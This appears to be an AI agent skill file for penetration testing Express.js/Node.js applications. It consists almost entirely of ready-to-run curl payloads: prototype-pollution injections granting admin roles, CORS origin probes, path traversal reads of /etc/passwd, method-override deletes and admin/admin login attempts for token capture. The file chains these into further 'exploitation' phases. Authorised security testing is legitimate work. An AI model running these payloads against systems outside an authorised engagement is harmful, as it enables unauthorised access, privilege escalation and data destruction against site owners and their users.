---
name: framework-express
description: "Express.js/Node.js security testing — prototype pollution, CORS misconfiguration, middleware bypass, npm dependency vulns, JWT abuse, path traversal via static serving, eval injection. Triggers: 'express', 'expressjs', 'node.js security', 'nodejs pentest', 'express middleware', 'node prototype pollution'."
---

# Express.js Security Testing

Node.js/Express attack surface: prototype pollution, CORS, middleware bypass, npm vulns.

## Phase 1: Fingerprinting

```bash
TARGET="https://TARGET"

curl -sI "$TARGET" | grep -i "x-powered-by\|express\|node"

for path in /api /api/v1 /api/v2 /graphql /health /metrics /status /debug /admin; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$path")
  echo "$code $path"
done | tee /workspace/output/express-paths.txt

curl -s "$TARGET/package.json" | python3 -m json.tool
curl -s "$TARGET/package-lock.json" | python3 -m json.tool | head -50
```

## Phase 2: Prototype Pollution

```bash
curl -s "$TARGET/api/search?__proto__[admin]=true&__proto__[role]=admin" | jq .
curl -s "$TARGET/api/data?constructor[prototype][admin]=1" | jq .

curl -s -X POST "$TARGET/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true,"role":"superuser"}}' | jq .

curl -s "$TARGET/api/profile" | jq .
```

## Phase 3: CORS Misconfiguration

```bash
curl -sI "$TARGET/api/user" -H "Origin: https://evil.com" | grep "Access-Control"

curl -sI "$TARGET/api/user" -H "Origin: null" | grep "Access-Control"

curl -sI "$TARGET/api/user" -H "Origin: https://attacker.TARGET.com" | grep "Access-Control"
```

## Phase 4: Middleware & Path Bypass

```bash
curl -s "$TARGET/static/../../../etc/passwd"
curl -s "$TARGET/public/%2e%2e/%2e%2e/etc/passwd"
curl -s "$TARGET/uploads/..%2f..%2fetc%2fpasswd"

curl -s -X POST "$TARGET/api/users/1" -H "X-HTTP-Method-Override: DELETE"
curl -s -X POST "$TARGET/api/users/1" -H "_method=DELETE"

curl -s "$TARGET/__coverage__"
curl -s "$TARGET/test"
curl -s "$TARGET/debug"
```

## Phase 5: JWT & Session Attacks

```bash
TOKEN=$(curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"admin"}' | jq -r '.token')

echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool

```

## Output

Save to `/workspace/output/`:
- `express-paths.txt` — API endpoint discovery
- `cors-test.txt` — CORS misconfig results

## Next Phase

→ `vuln-prototype-pollution` for deep prototype pollution exploitation
→ `vuln-cors` for CORS exploitation chain
